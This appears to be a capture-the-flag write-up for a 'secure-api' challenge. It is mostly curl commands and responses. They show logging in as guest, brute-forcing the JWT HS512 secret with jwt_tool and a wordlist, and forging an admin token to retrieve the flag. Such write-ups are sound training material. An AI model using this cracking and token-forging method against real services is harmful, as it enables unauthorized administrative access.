curl http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/
```
{"Error":"Authorization header not found! Try to login with guest credentials."}
```

curl http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/login
```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

curl -X POST http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/login
```
{"Error":"Missing username or password field."}
```

curl -X POST http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/login --data "username=guest&password=guest"
```
{"Token":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMjMxMTY1fQ.Je4R69KSCejZhQNkf-YIOp-NHvJYT4Rhua0kpTXFRxMU4aLfugD34e-byGJUN_QxQVQYLOH7gMulU8yMlv7-3A"}
```

curl http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080 -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMjMxMTY1fQ.Je4R69KSCejZhQNkf-YIOp-NHvJYT4Rhua0kpTXFRxMU4aLfugD34e-byGJUN_QxQVQYLOH7gMulU8yMlv7-3A"
```
{"Message":"Hi, guest! You are not admin, I have no secret for you."}
```

jwt.io
```
{
  "typ": "JWT",
  "alg": "HS512"
}
{
  "username": "guest",
  "exp": 1621231165
}
```

# Bruteforce Secret Key
python3 jwt_tool.py -C eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMjMxMTY1fQ.Je4R69KSCejZhQNkf-YIOp-NHvJYT4Rhua0kpTXFRxMU4aLfugD34e-byGJUN_QxQVQYLOH7gMulU8yMlv7-3A -d /usr/share/wordlists/rockyou.txt
```
[+] 147852369 is the CORRECT key!
```


jwt.io, username to admin
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjIxMjMxMTY1fQ.nd5OTFglGDy54EdOOTnG6TZHxBumQyw9Qwi8DawiWox2Y222OeHmFKOF6RI1uINsY8mNgqIuOmJtbWQjivGdtQ
```

curl http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080 -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjIxMjMxMTY1fQ.nd5OTFglGDy54EdOOTnG6TZHxBumQyw9Qwi8DawiWox2Y222OeHmFKOF6RI1uINsY8mNgqIuOmJtbWQjivGdtQ"
```
{"Message":"Hi, admin! I have a secret for you.","Secret":"dctf{w34k_k3y5_4r3_n0t_0k4y}"}
```